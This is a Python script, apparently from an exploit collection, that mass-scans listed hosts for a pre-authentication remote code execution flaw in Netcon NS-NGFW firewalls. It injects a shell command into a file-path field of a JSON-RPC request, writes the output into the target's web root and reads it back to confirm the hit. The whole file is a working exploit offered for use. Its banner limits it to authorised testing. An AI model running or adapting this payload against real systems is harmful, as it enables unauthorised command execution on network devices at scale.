#!/usr/bin/python3

import argparse
import requests
import json

requests.packages.urllib3.disable_warnings();

def banner():
    print("");
    print("**************************************************************************************************");
    print("奇安信 网康NS-NGFW前台RCE漏洞批量检测工具");
    print("Author: ybdt");
    print("Date: 2021/04/14");
    print("Location: https://github.com/ybdt/exp-hub/");
    print("**************************************************************************************************");
    print("");
    print("*************************警 告*****************************");
    print("本工具旨在帮助企业快速定位漏洞、修复漏洞,仅限授权安全测试使用!");
    print("请严格遵守《中华人民共和国网络安全法》,禁止未授权非法攻击站点!");
    print("***********************************************************");
    print("");
    print("");

def usage():
    parser = argparse.ArgumentParser(description="注意：每行IP需要指明协议，即以协议开头");
    parser.add_argument("-c", "--cmd", default="id",
                        help="批量检测漏洞时执行的命令，默认命令是：id");
    parser.add_argument("file",
                        help="包含IP列表的文件，IP每行一个");
    args = parser.parse_args();
    cmd = args.cmd;
    ip_file = args.file
    return cmd, ip_file;

def check_bug(ip, cmd):
    full_url = ip + "/directdata/direct/router";
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0"
    };
    payload = {};
    payload["action"] = "SSLVPN_Resource";
    payload["method"] = "deleteImage";
    payload["data"] = [{"data": ["/var/www/html/d.txt;id > /var/www/html/y.txt"]}];
    payload["type"] = "rpc";
    payload["tid"] = 17;
    try:
        r = requests.post(full_url, data=json.dumps(payload), headers=headers, verify=False);
    except requests.exceptions.ConnectionError:
        print(full_url + "-----connection error, maybe WAF");
        return False;
    verify_url = ip + "/y.txt";
    verify_r = requests.get(verify_url, verify=False);
    if "uid" in verify_r.text:
        print(full_url + "-----vulnerable");
        return True;
    else:
        print(full_url + "-----not vulnerable, maybe patched");
        return False;

def main():
    
    banner();

    cmd, ip_file = usage();    

    with open(ip_file, "r") as f_r:
        with open("success_url.txt", "w") as f_w:
            lines = f_r.readlines();
            for line in lines:
                ip = line.strip("\n");
                vulnerable = check_bug(ip, cmd);
                if vulnerable == True:
                    f_w.write(ip + "/directdata/direct/router" + "\n");
                else:
                    continue;

main();